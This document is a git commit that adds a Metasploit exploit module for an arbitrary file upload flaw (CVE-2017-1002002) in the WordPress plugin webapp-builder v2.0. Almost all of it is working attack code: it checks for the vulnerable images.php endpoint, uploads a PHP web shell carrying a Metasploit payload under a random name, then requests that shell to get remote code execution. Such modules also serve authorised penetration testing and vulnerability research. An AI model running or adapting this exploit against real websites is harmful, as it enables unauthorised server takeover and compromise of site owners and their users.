2dc8ee932edef4b82d3ba3004a3d8fb706efc353
Munir Njiru <munir.n.n@gmail.com>
2017-03-29 15:19:21 +0300

    Added 5 Remote File Upload Exploits
    Added 5 Remote file upload exploits

---
+++ metasploit_modules/wp_webapp_builder.rb
@@ -0,0 +1,92 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class MetasploitModule < Msf::Exploit::Remote
+
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HTTP::Wordpress
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Wordpress Plugin webapp-builder v2.0 Remote File Upload Exploit',
+      'Description'    => %q{
+        This module exploits an arbitrary PHP code upload vulnerability in the
+        Wordpress Plugin webapp-builder v2.0.
+		The vulnerability allows for arbitrary file upload and remote code execution.
+      },
+      'Author'         =>
+        [
+          'Larry W. Cashdollar', # Vulnerability discovery
+          'Munir Njiru <munir@alien-within.com>'  # Metasploit module
+        ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+		  ['CVE', '2017-1002002'],
+          ['EDB', '41540'],
+          ['WPVDB', '8773'],
+          ['URL', 'https://www.alien-within.com/wordpress-mobile-app-native-exploit/']
+        ],
+      'Privileged'     => false,
+      'Platform'       => 'php',
+      'Arch'           => ARCH_PHP,
+      'Targets'        => [['Wordpress Plugin webapp-builder v2.0', {}]],
+      'DisclosureDate' => 'March 7 2017',
+      'DefaultTarget'  => 0)
+    )
+  end
+
+  def check
+    peer = "#{rhost}:#{rport}"
+    uri = normalize_uri(target_uri.path)
+    uri << '/' if uri[-1,1] != '/'
+    checkScript = send_request_raw({'uri'=>normalize_uri(wordpress_url_plugins, 'webapp-builder','server','images.php')})
+    if checkScript and checkScript.code ==200
+      return Exploit::CheckCode::Appears
+    end
+    return Exploit::CheckCode::Safe
+  end
+
+  def exploit
+    peer = "#{rhost}:#{rport}"
+    uri = normalize_uri(target_uri.path)
+	p = payload.encoded
+    shellName = 'alien'+ rand_text_alpha(4 + rand(4)) + '.php'
+    data = Rex::MIME::Message.new
+    data.add_part(
+      "<?php #{p} ?>",                                   
+      'multipart/form-data',                            
+      nil,                                               
+      "form-data; name=\"file\"; filename=\"#{shellName}\""  
+    )
+    print_status("Uploading payload (#{p.length.to_s} bytes)...")
+    res = send_request_cgi({
+      'method' => 'POST',
+      'uri'    => normalize_uri(wordpress_url_plugins, 'webapp-builder','server','images.php'),
+      'ctype'  => "multipart/form-data; boundary=#{data.bound}",
+      'data'   => data.to_s
+    })
+	if not res
+      print_error("Hi perpetrator, it seems the victim has a defiant gene")
+      return
+    end
+	respShell=res.body
+	respShell["http://example.com/server/images/"]=""
+	@shellLoc  = normalize_uri(wordpress_url_plugins, 'webapp-builder','server','images',respShell.strip)
+    print_status("Requesting #{@shellLoc}")
+    res = send_request_cgi({'uri'=>@shellLoc})
+	
+    handler
+
+    if res and res.code == 404
+      print_error("Payload failed to upload")
+    end
+  end
+
+end
